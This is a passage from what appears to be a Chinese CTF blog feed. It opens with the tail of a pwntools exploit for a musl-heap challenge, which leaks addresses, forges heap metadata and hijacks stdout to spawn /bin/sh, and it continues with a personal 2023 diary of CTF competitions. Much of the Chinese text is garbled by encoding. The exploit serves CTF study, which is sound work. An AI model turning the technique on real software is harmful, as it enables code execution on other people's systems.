class="string">&#x27;option: &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        key_size = <span class="built_in">len</span>(key_content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(key_size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content: &#x27;</span>, key_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hash</span>(<span class="params">content</span>):</span><br><span class="line">    x = <span class="number">0x7e5</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> content:</span><br><span class="line">        x = <span class="built_in">ord</span>(c) + x * <span class="number">0x13377331</span></span><br><span class="line">    <span class="keyword">return</span> x &amp; <span class="number">0xfff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_key</span>(<span class="params">length=<span class="number">0x10</span>, h=<span class="number">0x7e5</span></span>):  <span class="comment"># é»˜è®¤ä¸º\nå¯¹åº”çš„hash</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x = <span class="string">&#x27;&#x27;</span>.join(random.choice(string.ascii_letters + string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length))</span><br><span class="line">        <span class="keyword">if</span> get_hash(x) == h:</span><br><span class="line">            <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">store(<span class="string">b&#x27;A&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">store(<span class="string">b&#x27;\n&#x27;</span>, <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">store(find_key(), <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">store(<span class="string">b&#x27;A\n&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>, <span class="number">0x1200</span>)</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">res = codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">mmap_base = u64(res[:<span class="number">8</span>]) - <span class="number">0x20</span></span><br><span class="line">chunk_addr = u64(res[<span class="number">8</span>:<span class="number">0x10</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(<span class="number">0</span>) + p64(chunk_addr - <span class="number">0x60</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">heap_base = u64(codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)[:<span class="number">8</span>]) - <span class="number">0x1d0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(<span class="number">0</span>) + p64(heap_base + <span class="number">0xf0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x200</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">query(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">libc.address = u64(codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)[:<span class="number">8</span>]) - <span class="number">0xb7040</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(<span class="number">0</span>) + p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\0&#x27;</span>))) + p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span> codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)[:<span class="number">8</span>] == <span class="string">b&#x27;/bin/sh\0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(<span class="number">0</span>) + p64(heap_base) + p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">secret = u64(codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)[:<span class="number">8</span>])</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;mmap base: %#x&#x27;</span> % mmap_base)</span><br><span class="line">log.info(<span class="string">&#x27;chunk address: %#x&#x27;</span> % chunk_addr)</span><br><span class="line">log.info(<span class="string">&#x27;heap base: %#x&#x27;</span> % heap_base)</span><br><span class="line">log.info(<span class="string">&#x27;libc base: %#x&#x27;</span> % libc.address)</span><br><span class="line">log.info(<span class="string">&#x27;secret: %#x&#x27;</span> % secret)</span><br><span class="line"></span><br><span class="line">fake_meta_addr = mmap_base + <span class="number">0x2010</span></span><br><span class="line">fake_mem_addr = mmap_base + <span class="number">0x2040</span></span><br><span class="line">stdout = libc.address + <span class="number">0xb4280</span>  </span><br><span class="line">log.info(<span class="string">&#x27;fake_meta_addr: %#x&#x27;</span> % fake_meta_addr)</span><br><span class="line">log.info(<span class="string">&#x27;fake_mem_addr: %#x&#x27;</span> % fake_mem_addr)</span><br><span class="line">log.info(<span class="string">&#x27;stdout: %#x&#x27;</span> % stdout)</span><br><span class="line"></span><br><span class="line"><span class="comment"># é€šè¿‡dequeueçš„unlinkåœ¨stdout-0x10 çš„åœ°æ–¹å†™å…¥fake_meta_addr</span></span><br><span class="line">sc = <span class="number">8</span> <span class="comment"># 0x90</span></span><br><span class="line">freeable = <span class="number">1</span></span><br><span class="line">last_idx = <span class="number">0</span></span><br><span class="line">maplen = <span class="number">1</span></span><br><span class="line">fake_meta = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_meta += p64(stdout - <span class="number">0x18</span>) <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(fake_meta_addr + <span class="number">0x30</span>) <span class="comment"># next</span></span><br><span class="line">fake_meta += p64(fake_mem_addr) <span class="comment"># mem</span></span><br><span class="line">fake_meta += p32(<span class="number">0</span>) + p32(<span class="number">0</span>) <span class="comment"># avail_mask, freed_mask</span></span><br><span class="line">fake_meta += p64((maplen &lt;&lt; <span class="number">12</span>) | (sc &lt;&lt; <span class="number">6</span>) | (freeable &lt;&lt; <span class="number">5</span>) | last_idx)</span><br><span class="line">fake_meta += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_mem = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_mem += p64(fake_meta_addr) <span class="comment"># meta</span></span><br><span class="line">fake_mem += p32(<span class="number">1</span>) <span class="comment"># active_idx</span></span><br><span class="line">fake_mem += p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0xaa0</span></span><br><span class="line">payload += p64(secret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += fake_meta</span><br><span class="line">payload += fake_mem</span><br><span class="line">payload += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(payload, <span class="number">0x1200</span>)</span><br><span class="line">store(<span class="string">b&#x27;A&#x27;</span>, p64(<span class="number">0</span>) + p64(fake_mem_addr + <span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">delete(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†è¯¥fake metaè¿›å…¥activeé˜Ÿåˆ—</span></span><br><span class="line">sc = <span class="number">8</span> <span class="comment"># 0x90</span></span><br><span class="line">last_idx = <span class="number">1</span></span><br><span class="line">fake_meta = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_meta += p64(<span class="number">0</span>) <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(<span class="number">0</span>) <span class="comment"># next</span></span><br><span class="line">fake_meta += p64(fake_mem_addr) <span class="comment"># mem</span></span><br><span class="line">fake_meta += p32(<span class="number">0</span>) + p32(<span class="number">0</span>) <span class="comment"># avail_mask, freed_mask</span></span><br><span class="line">fake_meta += p64((sc &lt;&lt; <span class="number">6</span>) | last_idx)</span><br><span class="line">fake_meta += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_mem = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_mem += p64(fake_meta_addr) <span class="comment"># meta</span></span><br><span class="line">fake_mem += p32(<span class="number">1</span>) <span class="comment"># active_idx</span></span><br><span class="line">fake_mem += p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0xa90</span></span><br><span class="line">payload += p64(secret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += fake_meta</span><br><span class="line">payload += fake_mem</span><br><span class="line">payload += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line">query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(payload, <span class="number">0x1200</span>)</span><br><span class="line">store(<span class="string">b&#x27;A&#x27;</span>, p64(<span class="number">0</span>) + p64(fake_mem_addr + <span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">delete(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿®æ”¹metaçš„memåŒºåŸŸæŒ‡å‘stdout-0x10</span></span><br><span class="line">fake_meta = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_meta += p64(fake_meta_addr) <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(fake_meta_addr) <span class="comment"># next</span></span><br><span class="line">fake_meta += p64(stdout - <span class="number">0x10</span>) <span class="comment"># mem</span></span><br><span class="line">fake_meta += p32(<span class="number">1</span>) + p32(<span class="number">0</span>) <span class="comment"># avail_mask, freed_mask</span></span><br><span class="line">fake_meta += p64((sc &lt;&lt; <span class="number">6</span>) | last_idx)</span><br><span class="line">fake_meta += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x18</span></span><br><span class="line">fake_meta += p64(stdout - <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0xa80</span></span><br><span class="line">payload += p64(secret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += fake_meta</span><br><span class="line">payload += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">query(payload, <span class="number">0x1200</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å†™å…¥fake file</span></span><br><span class="line">fake_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_file += <span class="string">b&quot;/bin/sh&quot;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># flags</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># close</span></span><br><span class="line">fake_file += p64(<span class="number">0x114514</span>)  <span class="comment"># wend</span></span><br><span class="line">fake_file += p64(<span class="number">0x114514</span>)  <span class="comment"># wpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># mustbezero_1</span></span><br><span class="line">fake_file += p64(<span class="number">0x114514</span>)  <span class="comment"># wbase</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># read</span></span><br><span class="line">fake_file += p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>])  <span class="comment"># write</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x80</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">store(<span class="string">b&#x27;A&#x27;</span>, fake_file, value_size=<span class="number">0x80</span>, wait=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a href="https://bbs.kanxue.com/thread-269533.htm">https://bbs.kanxue.com/thread-269533.htm</a><br><a href="https://www.anquanke.com/post/id/246929">https://www.anquanke.com/post/id/246929</a><br><a href="https://blog.csdn.net/qq_45323960/article/details/129800670">https://blog.csdn.net/qq_45323960&#x2F;article&#x2F;details&#x2F;129800670</a><br><a href="https://www.anquanke.com/post/id/241104#h2-3">https://www.anquanke.com/post/id/241104#h2-3</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023å°çç¢è®°å½•è´´</title>
      <link href="/2023/12/27/2023%E5%B0%8F%E7%90%90%E7%A2%8E%E8%AE%B0%E5%BD%95%E8%B4%B4/"/>
      <url>/2023/12/27/2023%E5%B0%8F%E7%90%90%E7%A2%8E%E8%AE%B0%E5%BD%95%E8%B4%B4/</url>
      
        <content type="html"><![CDATA[<h1 id="2023-3-27"><a href="#2023-3-27" class="headerlink" title="2023&#x2F;3&#x2F;27"></a>2023&#x2F;3&#x2F;27</h1><p>åŠ å…¥<code>Sloth</code>å’¯ï¼ï¼ï¼<br>ä¸Šå­¦æœŸ<code>XSCTF</code>è”åˆæ‹›æ–°èµ›çˆ†<code>0</code>åå°±æ²¡æœ‰åœ¨<code>CTF</code>èµ°ä¸‹å»çš„æ‰“ç®—ï¼Œå¯æ˜¯å¯’å‡åœ¨æš¨å¤§çš„<code>i_corner</code>å¸ˆå‚…çš„é¼“åŠ±ä¸‹æ‰“ç®—å†åŠªåŠ›ä¸€æŠŠï¼Œåˆ·äº†<code>2</code>ä¸ªå¤šæœˆçš„<code>Crypto</code>å’Œ<code>misc</code>ï¼Œæœ€ååœ¨é€‰æ‹”èµ›æ‹¿äº†å…¨åœºä¸€è¡€(æˆ‘æœ€çˆ±çš„RSA)ï¼Œå¤ªæ„ŸåŠ¨äº†<code>QAQ</code><br>ä¸è¿‡ä¹Ÿæ„Ÿå—åˆ°äº†å·®è·ï¼Œç¬¬ä¸€åå’Œç¬¬äºŒåæ˜¯å¤§äºŒçš„å­¦é•¿ï¼Œåˆ†æ•°æ¯”æˆ‘é«˜å¥½å¤šï¼ŒåŒçº§çš„ä¹Ÿæœ‰ä¸€ä½é€†å‘å¥½å‰å®³<code>QAQ</code><br>æä¸€æï¼Œå•è½¦å˜æ‘©æ‰˜ï¼Œæˆ‘è¦è¶…è¶Šä»–ä»¬ï¼ï¼ï¼ï¼</p><h1 id="2023-4-2"><a href="#2023-4-2" class="headerlink" title="2023&#x2F;4&#x2F;2"></a>2023&#x2F;4&#x2F;2</h1><p>æ­£å¼å¼€å§‹å­¦<code>pwn</code>äº†æ  </p><img src="/2023/12/27/2023%E5%B0%8F%E7%90%90%E7%A2%8E%E8%AE%B0%E5%BD%95%E8%B4%B4/1.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <h1 id="2023-5-28"><a href="#2023-5-28" class="headerlink" title="2023&#x2F;5&#x2F;28"></a>2023&#x2F;5&#x2F;28</h1><p>ç¬¬ä¸€æ¬¡æ‰“æ¯”èµ›ï¼Œç»™æ‰“çƒ‚äº†æ&gt;_&lt;<br>æ‰“äº†ä¸€ä¸ªæœˆçš„<code>ret2libc</code>,æ‰å‘ç°<code>pwn</code>åŸæ¥è¿˜æœ‰è¿™ä¹ˆå¤šä¸œè¥¿ï¼Œçœ‹æ¥è¦ç‹ ç‹ çš„å·äº†  </p><img src="/2023/12/27/2023%E5%B0%8F%E7%90%90%E7%A2%8E%E8%AE%B0%E5%BD%95%E8%B4%B4/2.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <h1 id="2023-8-26"><a href="#2023-8-26" class="headerlink" title="2023&#x2F;8&#x2F;26"></a>2023&#x2F;8&#x2F;26</h1><p>å¥½è€¶ï¼Œé—­å…³ä¸€æ®µæ—¶é—´å†å‚åŠ æ¯”èµ›(è“å¸½æ¯)ï¼Œå‡ºäº†ä¸€é“å †é¢˜ï¼Œæˆå°±æ„Ÿæ‹‰æ»¡ï¼ï¼ï¼ï¼ï¼ï¼</p><h1 id="2023-9-10"><a href="#2023-9-10" class="headerlink" title="2023&#x2F;9&#x2F;10"></a>2023&#x2F;9&#x2F;10</h1><p>æ•°æ¨¡å›½èµ›é€†å¤§å¤©ï¼Œé¦–å…ˆæ˜¯æœ‰<code>78w</code>è¡Œæ•°æ®ï¼Œè„šæœ¬è·‘ä¸€æ¬¡å¥½å¥½å‡ åˆ†é’Ÿï¼Œå…¶æ¬¡æ˜¯é¢˜ç›®å®Œå…¨æ²¡æœ‰æ€è·¯ï¼Œæ‰¾ä¸åˆ°é€‚ç”¨çš„æ¨¡å‹<code>&gt;_&lt;</code>ï¼Œå®Œå…¨é é˜Ÿå‹å¸¦é£<code>Orz</code></p><h1 id="2023-10-15"><a href="#2023-10-15" class="headerlink" title="2023&#x2F;10&#x2F;15"></a>2023&#x2F;10&#x2F;15</h1><p>é¦™å±±æ¯å¤ªäºäº†ï¼Œå·®ä¸€ç‚¹ç‚¹(å‡ åˆ†)è¿›å†³èµ›ï¼Œé—®é¢˜å‡ºåœ¨<code>pwn</code>æ‰‹(æˆ‘),<code>pwn</code>å·®ä¸€é¢˜<code>Ak</code>ï¼Œå‰©ä¸‹ä¸€é¢˜<code>python pwn</code>ï¼Œæ¼æ´å‡ºç°åœ¨<code>python</code>ç¨‹åºè°ƒç”¨çš„å‡½æ•°åŒ…ï¼Œå‡½æ•°åŒ…ç”¨<code>C++</code>å†™çš„ï¼Œå­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å’Œæ ˆæº¢å‡ºï¼Œå¯æ˜¯æˆ‘æœ¬åœ°å¯åŠ¨ä¸äº†ç¨‹åºï¼Œè°ƒè¯•ä¸äº†<code>QAQ</code>ï¼Œè¡€äºï¼Œæˆ‘èƒŒé”…ã€‚èµ›åå‘ç°è¦ä½¿ç”¨<code>python3.7</code>æ‰å¯ä»¥å¯åŠ¨ç¨‹åºï¼Œè£‚å¤§å¼€<br>åæœŸè¡¥å……ï¼šå†³èµ›<code>awdp</code>çš„<code>3</code>é¢˜<code>pwn</code>æˆ‘éƒ½ä¼šåšï¼Œæ²¡å»çº¿ä¸‹å¤ªå¯æƒœäº†ï¼Œå“¦å¯¹ï¼Œæˆ‘è¿˜æ²¡è¿›è¿‡çº¿ä¸‹(å‘å¾®)</p><h1 id="2023-10-16"><a href="#2023-10-16" class="headerlink" title="2023&#x2F;10&#x2F;16"></a>2023&#x2F;10&#x2F;16</h1><p>XSCTFè”åˆæ‹›æ–°èµ›ç»“æŸæ‹‰ï¼Œå˜¿å˜¿ï¼Œç¬¬ä¸€æ¬¡å‡ºé¢˜(ä¸€é“ç®€å•çš„libc-2.27çš„unlink)ï¼Œå±…ç„¶æ²¡äººåšï¼Ÿå®Œäº†ï¼Œè¦ç»™<code>JANlittle</code>æ‹‰å»å–‚é±¼äº†</p><img src="/2023/12/27/2023%E5%B0%8F%E7%90%90%E7%A2%8E%E8%AE%B0%E5%BD%95%E8%B4%B4/3.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>pwnçš„è§£é¢˜æƒ…å†µæƒ¨ä¸å¿ç¹ï¼Œåˆ«åç»§æ— äººå•ŠQAQ(ä»¥åè°æ¥å¸¦æˆ‘)<br>133nsonå’ŒCsomeå¸ˆå…„å‡ºçš„<code>pwn</code>é¢˜è´¨é‡æ˜¯çœŸçš„é«˜ï¼Œæˆ‘è¦å¥½å¥½å­¦ä¹ </p><h1 id="2023-11-9"><a href="#2023-11-9" class="headerlink" title="2023&#x2F;11&#x2F;9"></a>2023&#x2F;11&#x2F;9</h1><p>å˜¿å˜¿ï¼Œ<code>CS</code>æ¯é€‰æ‹”èµ›ï¼Œæ¬ºè´Ÿè€å®äºº<br>è°è¯´ç®—æ³•åªèƒ½ç”¨<code>C/C++</code>æ‰“çš„ï¼Œä¸Š<code>python</code>ï¼ï¼ï¼ï¼ï¼<br>4é“é¢˜15åˆ†é’Ÿå¹²äº†3é¢˜ï¼Œè€Œä¸”2é¢˜ä¸€è¡€ï¼Œä¸è¿‡æœ€åä¸€é¢˜ç”¨æ·±æœè¶…æ—¶ï¼Œåˆ°æœ€åéƒ½æ²¡æœ‰åšå‡ºæ¥ï¼Œå“ï¼Œç®—æ³•å¤ªçƒ‚äº†ï¼Œè€Œä¸”å¥½ä¹…æ²¡çœ‹äº†ï¼Œäººèœç˜¾å¤§xD</p><h1 id="2023-12-9"><a href="#2023-12-9" class="headerlink" title="2023&#x2F;12&#x2F;9"></a>2023&#x2F;12&#x2F;9</h1><p>PolarCTFæ‰“çˆ½äº† Solved:24 grade:7000 rank:3<br>11é¢˜pwnå…¨éƒ½ä¼š(æœ‰ä¸€é¢˜<code>house of orange</code>å«Œéº»çƒ¦ä¸”åˆ†ä¸é«˜æ²¡æ‰“ï¼Œç»“æœç»™<code>jelasin</code>å¸ˆå‚…éª‚äº†<code>QAQ</code>)ï¼Œè¿˜æ‹¿äº†é¢˜å”¯ä¸€è¡€(é¢„æœŸè§£ä¸ºæ”¹<code>printf</code>çš„æ ¼å¼è¡¨ï¼Ÿä¸å­˜åœ¨çš„ï¼Œæ‰“<code>IO</code>æ‰æ˜¯<code>yyds</code>ï¼ï¼ï¼)<br>Cryptoå…¨æ˜¯è„‘æ´é¢˜ï¼Œæ²¡æœ‰æ•°å­¦é¢˜ï¼Œå·®è¯„QAQï¼Œåªä¼šæ•°å­¦é¢˜&gt;_&lt;<br>æœ‰é¢˜é€†å‘åšå‡ºæ¥åæ€ä¹ˆäº¤éƒ½æ˜¯é”™ï¼Œç»“æŸåæ‰å‘ç°<code>flag</code>è¦è¿›è¡Œ<code>md5</code>åŠ å¯†ï¼Œé€†å¤©(è²Œä¼¼é¢˜ç›®ä¸Šä¹Ÿæ²¡æœ‰è¯´æ˜XD)</p><h1 id="2023-12-10"><a href="#2023-12-10" class="headerlink" title="2023&#x2F;12&#x2F;10"></a>2023&#x2F;12&#x2F;10</h1><p>ç»™<code>Csome</code>å¸ˆå…„æ‹‰å»<code>S1uM4i</code>æ‰“<code>TCTF/0CTF</code>,åå¤§ç‰¢ï¼ï¼ï¼é¢˜ç›®è¿‡äºé€†å¤©ï¼Œè¿ä»€ä¹ˆ<code>ios kernel</code>éƒ½æ¥äº†ï¼Œæ„Ÿè§‰æœ€å°‘è¿˜è¦å†ç»ƒä¸€å¹´æ‰èƒ½åœ¨è¿™ä¸ªæ¯”èµ›ä¸Šåšå‡ºé¢˜ã€‚<br>æ‰å¤§äºŒï¼Œè¿˜æ¥å¾—åŠï¼Œå†²ï¼ï¼ï¼ï¼</p><h1 id="2023-12-17"><a href="#2023-12-17" class="headerlink" title="2023&#x2F;12&#x2F;17"></a>2023&#x2F;12&#x2F;17</h1><p>å¼ºç½‘æ¯å¤ªé€†å¤©äº†å•Šï¼Œå­¦ä¼šäº†å„ç§<code>io file</code>æ”»å‡»ä»¥ä¸ºå¯ä»¥ä¹±æ€ï¼Œç»“æœå‘ç°é¢˜ç›®éƒ½æ˜¯<code>VM</code>ç±»å‹ï¼Œå®Œå…¨çœ‹ä¸æ‡‚é€†å‘ï¼Œçœ‹æ¥<code>kernel</code>è¦å»¶åä¸€æ®µæ—¶é—´å†å­¦äº†ï¼Œå…ˆæŠŠ<code>vmpwn</code>ç»™æ‹¿ä¸‹<br>æ¯”èµ›æœ‰ç‚¹å¯æƒœï¼Œå·®ä¸€ç‚¹è¿›å†³èµ›<code>QAQ</code>ï¼Œå½’æ ¹åˆ°åº•æ˜¯æˆ‘çš„é—®é¢˜ï¼Œé˜Ÿå‹å¾ˆ<code>c</code>äº†ï¼Œè¦æ˜¯æˆ‘èƒ½æŠŠé‚£ä¸¤é¢˜ç®€å•<code>pwn</code>åšå‡ºæ¥å°±èƒ½è¿›å†³èµ›äº†(<code>WTOA</code>å’Œ<code>A-rtsp</code> éƒ½æ˜¯çœ‹ä¸æ‡‚é€†å‘ï¼Œæˆ‘çš„<code>500</code>åˆ†é¸­<code>QAQ</code>)ï¼Œå¯’å‡ç»™æˆ‘ç‹ ç‹ å·ï¼ï¼ï¼ï¼ å¤‡æˆ˜æœŸæœ«ï¼Œè¿™å­¦æœŸç»©ç‚¹å¿…é¡»ç»™æˆ‘é«˜é«˜é«˜ï¼ï¼ï¼ï¼</p><img src="/2023/12/27/2023%E5%B0%8F%E7%90%90%E7%A2%8E%E8%AE%B0%E5%BD%95%E8%B4%B4/4.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>è™½ç„¶å¾ˆé—æ†¾ï¼Œä¸è¿‡ä¹Ÿå­¦åˆ°äº†æ€ä¹ˆé€šè¿‡<code>puts</code>å‡½æ•°æ¥è°ƒç”¨<code>io</code>é“¾ï¼Œä¹Ÿç®—æ˜¯ä¸€ç§æ‰€è·å§ï¼Œå¼ºç½‘æ¯å·²ç»æ²¡æœ‰æƒ³è¿›å†³èµ›çš„æ¬²æœ›äº†ï¼Œå¤ªå·äº†<br>æ„Ÿè§‰<code>AFL fuzz</code>æŠ€æœ¯ä¹Ÿè¦å­¦å­¦ï¼Œåœ¨å¾ˆå¤šé¢˜ç›®ä¸Šéƒ½èƒ½ç”¨åˆ°</p><h1 id="2023-12-28"><a href="#2023-12-28" class="headerlink" title="2023&#x2F;12&#x2F;28"></a>2023&#x2F;12&#x2F;28</h1><p>å¥½å¥½å¥½ï¼Œä¸Šå¤§å­¦ä¸€å¹´å¤šï¼Œå·²ç»å˜æˆ<code>IT</code>çš„å½¢çŠ¶äº†</p><img src="/2023/12/27/2023%E5%B0%8F%E7%90%90%E7%A2%8E%E8%AE%B0%E5%BD%95%E8%B4%B4/5.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>è€ƒå®Œ<code>java</code>æ”¾æ¾çš„æ—¶å€™ç¿»äº†ä¸€ä¸‹ä¸Šå­¦æœŸæ ¡é˜Ÿé€çš„<code>ã€ŠCTFæƒå¨æŒ‡å— pwnç¯‡ã€‹</code>,å‘ç°é‡Œé¢çš„å†…å®¹ç¡®å®åŸºç¡€å’Œç®€å•ï¼Œä¸è¿‡å½“æ—¶ä¹°å›æ¥çœ‹çš„æ—¶å€™æ„Ÿè§‰åœ¨çœ‹å¤©ä¹¦ï¼ŒçœŸå±äºæ˜¯ä¸ä¼šæ—¶çœ‹å¤©ä¹¦ï¼Œä¼šæ—¶ç”¨ä¸ä¸Šäº†<br>é‡Œé¢çš„å¾ˆå¤šå 